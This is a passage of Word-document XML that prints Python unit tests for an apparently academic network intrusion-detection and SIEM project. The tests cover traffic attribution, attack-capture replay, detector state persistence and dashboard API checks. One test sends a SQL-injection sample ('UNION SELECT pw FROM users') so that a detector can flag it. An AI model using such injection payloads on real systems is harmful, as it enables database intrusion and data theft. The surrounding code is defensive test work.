    <w:p w14:paraId="52A79F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"192.0.2.10": {"packets": 80, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038EA0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"192.0.2.20": {"packets": 20, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119D02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4F7F8F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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BACAA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self.sensor._dominant_source(stats, 100), "192.0.2.10")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1C5CE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25E5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test_distributed_traffic_is_not_attributed_or_blockable(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D71E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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C4DA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"192.0.2.10": {"packets": 40, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFFB7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"192.0.2.20": {"packets": 35, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33200C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"192.0.2.30": {"packets": 25, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9DC2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123EB5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self.assertIsNone(self.sensor._dominant_source(stats, 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB5B0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38A93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3BFEA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TestReplayPipeline(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049C12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"""Generate a scenario capture, replay it, and check the right engines fire."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7273E0D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853A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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1682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setUpClass(cls):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A7CF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cls.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC0D8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cls.path = os.path.join(cls.tmp, "scenario.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673919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replay.generate_scenario(cls.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14816E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cls.summary = replay.ReplayEngine().run(cls.path, verbose=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448802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DEB5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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF248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def tearDownClass(cls):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCD8E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shutil.rmtree(cls.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ED9D2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1B2D3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test_capture_is_valid_pcap(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446063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 = pcap.PcapReader(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D5E0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self.assertEqual(reader.linktype, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68000B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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BFD52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6237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test_all_frames_decode_without_error(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090A4B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self.assertGreater(self.summary["packets"], 1000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0843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self.assertEqual(self.summary["parser"]["malformed"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3723237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140E4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test_every_engine_detects_its_own_attack(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E73A9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hits = self.summary["engine_hits"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464533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engine in ("z_score", "knn", "naive_bayes", "bloom", "kmeans"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C81C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self.assertGreater(hits[engine], 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F2E4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"%s produced no detections" % engine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B455D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19E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test_port_scan_detected_only_during_scan_window(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505888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generated scan runs from t=15s to t=20s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6693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scan_times = [a["t"] for a in self.summary["alerts"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D249A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if a["engine"] == "knn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104B5B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self.assertTrue(scan_times)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FAD8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t in scan_times:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734A57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self.assertGreaterEqual(t, 15.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061EBC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self.assertLess(t, 20.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64207C6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D51AB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test_normal_baseline_produces_no_alerts(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512D21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baseline_alerts = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B764F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alert for alert in self.summary["alerts"] if alert["t"] &lt; 15.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E20F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3F70C9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self.assertEqual(baseline_alerts, [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E72C6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9FED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test_controlled_interval_attacks_have_source_attribution(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796604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alert in self.summary["alerts"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C044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alert["engine"] in ("z_score", "knn", "kmeans"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40067D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self.assertTrue(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FFD6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alert["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DD1B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"%s alert was not attributed" % alert["engine"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758226D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195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test_alerts_carry_attack_technique_and_risk(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710EC0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alert in self.summary["alerts"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0CDD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self.assertTrue(alert["technique_id"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E95A7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self.assertNotEqual(alert["technique_id"], "N/A")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4AD4B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self.assertGreater(alert["risk_score"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CE9B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C226BD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8F5C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TestBrainRoundTripAcrossEngines(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EB452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"""A saved brain must restore every engine's learned state (FR-8)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C80CE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A4EFB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test_all_five_engines_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8DE1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engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FDB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engines.kmeans as kmeans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558165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engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602DD2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engines.naive_bayes as nb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FF1A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engines.z_score as zs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9F5C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59D0A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original = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249BDA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"z_score": zs.MinimalistStats(window_size=10),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A149A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"knn": knn.KNNMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5378A2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"payload": nb.PayloadMonitor(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FB2B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"kmeans": kmeans.KMeansMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB51E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"bloom": bloom.BloomFilter(size=200, hash_count=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0270CE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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9FB1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564D2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give each engine something to learn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F3DC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pps in [10, 12, 11, 13, 9, 10, 12]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015322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original["z_score"].analyse(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5A06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_ in range(12):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A8F5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original["kmeans"].analyse(11, 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E8B8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original["bloom"].add("192.0.2.66")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FEC29E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1100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 = {k: e.export_brain() for k, e in original.items()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313DB6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must survive a real JSON serialisation, not just an in-memory dict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278454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 = json.loads(json.dumps(brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB7956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EC17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restored = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4E0C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"z_score": zs.MinimalistStats(window_size=10),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204807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"knn": knn.KNNMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066433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"payload": nb.PayloadMonitor(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2289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"kmeans": kmeans.KMeansMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410475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"bloom": bloom.BloomFilter(size=200, hash_count=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6323BD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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3CD0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key, engine in restored.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5113E7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self.assertTrue(engine.import_brain(brain[key]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A1D2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"%s failed to import its brain" % key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720A090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0940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self.assertAlmostEqual(restored["z_score"].w_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF13C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original["z_score"].w_mean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A6D44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self.assertEqual(restored["kmeans"].centroids,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2B26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original["kmeans"].centroids)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417B58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self.assertTrue(restored["bloom"].check("192.0.2.66"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FE96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self.assertEqual(set(restored["payload"].likelihoods),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D692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set(original["payload"].likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ABB57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005962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5F54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212F16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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266CE608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src/tests/test_siem_api.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC1926E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(205 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1B51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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460F25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"""System-tier test: the SIEM HTTP API and JSON telemetry path.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E30B2D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491B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This is the top tier of the Chapter 6 testing strategy - it starts the real</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B779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UDP listener and the real HTTP server, sends real datagrams through a socket,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B203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and asserts on the responses the browser would receive. It therefore verifies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5546D5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FR-5 (structured JSON alert transport) and FR-6 (real-time dashboard rendering)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197D9B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rather than testing them in isolation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B2830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59E2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The test binds real ports, so it is skipped automatically if they are already</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344EBB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 use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8D04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7BF0082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7523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22E17D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3F85BD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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B250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3BD466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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E677C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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432084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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5176FE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urllib.request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0C7B2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DDB7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4EDA45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26B85B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0989DB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08A4D5E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AE5B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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A00D3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utils.logger as logger_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD19B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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404E24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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10ED384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95C5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BASE = "http://127.0.0.1:8080"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CB7B4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45C2F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35451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_port_free(port, kind=socket.SOCK_STREAM):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B7F2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 = socket.socket(socket.AF_INET, kind)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE821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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575A8B2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s.bind(("127.0.0.1", port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479985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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679BB9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except OSError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C37D8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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657734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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292F91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s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EBD19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D4DF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83BB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_get_json(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAC21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with urllib.request.urlopen(BASE + path, timeout=5) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8405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return json.loads(r.read().decode("utf-8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD36E9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D4588B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9ABE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@unittest.skipUnless(_port_free(8080) and _port_free(9999, socket.SOCK_DGRAM),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E96B5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"ports 8080/9999 already in use")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AAF5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TestSiemApi(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578D9F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38B2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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D310E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setUpClass(cls):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFFD0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import dashboard_ui.siem as siem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EA23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cls.siem = siem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164EC5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threading.Thread(target=siem.start_siem, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EEE5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time.sleep(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75EB1C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BB3A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populate the in-memory ring buffer with genuinely decoded frames</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B3F2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parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467347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cls.frames = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9B02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parser_mod.build_tcp(sport=4000 + i, dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C452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data=b"GET /index.html HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA9ED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i in range(5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F8C0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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0C3C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cls.frames.append(parser_mod.build_udp(sport=5353, dport=53,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097D90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     data=b"dns-query"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31230CD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cls.frames.append(parser_mod.build_icmp(icmp_type=8))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B07A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556B8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frame in cls.frames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B039D9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pkt = parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C2C3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packet_store.STORE.add({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC6ED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"ts": time.time(), "time": packet_store.now_hms(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A11B6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"src": pkt["src"], "dst": pkt["dst"], "proto": pkt["proto"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA5BE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"sport": pkt["sport"], "dport": pkt["dport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5490AE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"length": pkt["length"], "info": pkt["info"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D800D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"verdict": "clean", "hex": frame.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448BE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})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A172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packet_store.STORE.update_stats(120, 11.5, 4.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAE485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19D5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send structured JSON alerts over the wire (FR-5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3414C3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 = logger_mod.UDPSender("127.0.0.1", 9999)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA53A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sender.send_log("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC3C9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src_ip="192.0.2.66", confidence=0.99,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E03E5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payload=b"id=1 UNION SELECT pw FROM users")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269809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sender.send_log("DDoS DETECTED! Z-Score: 5.10 (PPS: 9000)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B984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src_ip="10.0.0.9", confidence=0.9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352B65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sender.send_log("PORT SCAN DETECTED! (Unique Ports: 210/sec)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE4E7A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src_ip="192.0.2.5", confidence=0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549812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time.sleep(1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6914B0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9D3AD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test_stats_endpoint_reports_live_traffic(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C5B5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_get_json("/api/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E2D1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self.assertEqual(stats["pps"], 120)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9560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self.assertAlmostEqual(stats["z_score"], 4.2, places=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509F5A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self.assertFalse(stats["ddos_candidate"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6C5E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self.assertFalse(stats["ddos_active"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34831AE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self.assertGreaterEqual(stats["packets_buffered"], 7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AC7B4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self.assertGreaterEqual(stats["proto_counts"]["TCP"], 5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0801CE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self.assertGreaterEqual(stats["proto_counts"]["ICMP"], 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484897D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3F6C6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test_dashboard_is_utf8_without_broken_symbols(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1CFA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urllib.request.urlopen(BASE + "/", timeout=5) as response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC961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self.assertEqual(response.headers.get_content_charset(), "utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE28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body = response.read().decode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451701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self.assertNotIn("â", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9092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</w:t>
      </w:r>
      <w:r w:rsidRPr="00B15925">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
        </w:rPr>
        <w:t>⭳</w:t>
      </w:r>
      <w:r w:rsidRPr="00B15925">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5835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self.assertIn("Export .pcap (Wireshark)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720AD38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46217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test_json_alerts_are_ingested_with_attack_context(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623B80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_get_json("/api/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FABB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self.assertGreaterEqual(stats["total_alerts"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7B99E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2CC09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techniques = {a.get("technique_id") for a in stats["alerts"]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3896A5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self.assertIn("T1190", techniques)   # payload  -&gt; Initial Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06600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self.assertIn("T1498", techniques)   # flood    -&gt; Impact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3592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self.assertIn("T1046", techniques)   # scan     -&gt; Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E489A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250FF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match on source address rather than position: other tests in this</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586BA0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class also emit T1190 alerts, and execution order is alphabetical</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FB0B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payload_alert = next(a for a in stats["alerts"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F9E1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if a.get("src_ip") == "192.0.2.66")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3E66F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self.assertEqual(payload_alert["technique_id"], "T1190")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E00B9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self.assertEqual(payload_alert["severity"], "HIGH")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCB88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self.assertGreater(payload_alert["risk_score"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1749EC2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F5EC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test_credentials_never_reach_the_dashboard(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8C99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the excerpt forwarded over UDP must already be redacted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE7AF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 = logger_mod.UDPSender("127.0.0.1", 9999)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593E58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sender.send_log("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E638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src_ip="192.0.2.7", confidence=0.95,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6600BD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payload=b"password=hunter2&amp;email=bob@example.com UNION")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45712B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time.sleep(0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AF68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body = json.dumps(_get_json("/api/stats"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61445B6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self.assertNotIn("hunter2", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16737C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self.assertNotIn("bob@example.com", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677CEF0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EEBC5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test_attack_technique_rollup(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760F27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stats = _get_json("/api/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5919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self.assertTrue(stats["top_techniques"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B27A0E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self.assertGreater(stats["max_risk"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A54715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8C21A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test_malformed_datagram_is_rejected_not_crashing(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF37C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port 9999 is itself a scan target, so raw bytes do arrive</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE9DE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 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFC4E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s.sendto(b"\x00\x01\x02\xff\xfe not json at all", ("127.0.0.1", 9999))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5087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s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7564F0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time.sleep(0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7579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stats = _get_json("/api/stats")   # server must still be responsive</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B2C1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self.assertIn("INVALID UDP PAYLOAD",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A589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json.dumps(stats["alerts"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AB561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12ED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test_packets_endpoint_returns_decoded_rows(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3B85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data = _get_json("/api/packets?limit=50")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398A1AB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self.assertGreaterEqual(len(data["packets"]), 7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022FAC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 = data["packets"][0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F028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for key in ("src", "dst", "proto", "length", "info", "hex"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4636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self.assertIn(key, row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B38BA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00AD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test_protocol_filter(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0923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icmp = _get_json("/api/packets?limit=50&amp;proto=ICMP")["packets"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529C4D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self.assertTrue(icmp)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5162F7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self.assertTrue(all(p["proto"] == "ICMP" for p in icmp))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB0D9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9D9B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test_config_endpoint_exposes_effective_policy(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446CCC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cfg = _get_json("/api/config")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF982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# NFR-3 defaults must be visible and safe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1DCF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self.assertFalse(cfg["block_enabled"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B791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self.assertTrue(cfg["privacy_mode"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A466D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self.assertEqual(cfg["payload_excerpt_bytes"], 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE5DB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self.assertEqual(cfg["ddos_min_pps"], 500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F357F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self.assertEqual(cfg["ddos_consecutive_intervals"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5262B47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FB2629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test_pcap_export_is_openable_by_wireshark(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697C41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urllib.request.urlopen(BASE + "/api/export.pcap", timeout=5) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFCAE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self.assertEqual(r.headers.get("Content-type"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAC12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"application/vnd.tcpdump.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3EB8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raw = r.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634820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0FE8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path = os.path.join(HERE, "_siem_export.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A65FB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75665A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open(path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A0C8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f.write(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4716D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B42F0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reader = pcap.PcapReader(path)          # validates the magic number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6211F8A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self.assertEqual(reader.linktype, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667E07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recovered = list(reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEAD1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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7485C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33DE2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self.assertGreaterEqual(len(recovered), 7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2837E66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# each exported frame must decode back into a real packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038E05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parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6E7B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_ts, data, _orig in recovered:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B72480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self.assertIsNotNone(parser.parse(data))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A432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2D5B31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if os.path.exists(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8AAF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os.remove(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496936F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6FA8D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AADB9B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65B996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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
